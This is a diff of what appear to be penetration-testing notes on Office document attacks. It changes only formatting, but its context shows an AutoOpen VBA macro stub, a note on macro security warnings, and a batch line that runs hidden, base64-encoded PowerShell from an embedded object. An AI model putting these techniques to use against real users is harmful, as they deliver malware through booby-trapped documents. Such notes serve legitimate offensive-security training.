@@ -1347,7 +1347,7 @@ Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/prev
         - The `AutoOpen` procedure is executed when a new document is opened
         - The `Document_Open` procedure is executed when an already-open document is re-opened
             
-            ```visual-basic
+            ```VBA
             Sub AutoOpen()
             	MyMacro
             End Sub
@@ -1377,7 +1377,7 @@ Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/prev
         print(f'Str = Str + "{str[i:i+n]}"')
     ```
     
-    ```visual-basic
+    ```VBA
     Sub AutoOpen()
     	MyMacro
     End Sub
@@ -1397,13 +1397,13 @@ Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/prev
     ```
     
     > **Note**: the macro security warning only re-appears if the name of the document is changed
-    > 
+
 - Embedding/Linking Object using Batch file:
     - Word or Excel:
         - *Insert > Object > Create from File*
         - Import a Batch File
             
-            ```
+            ```batch
             START powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>
             ```
             
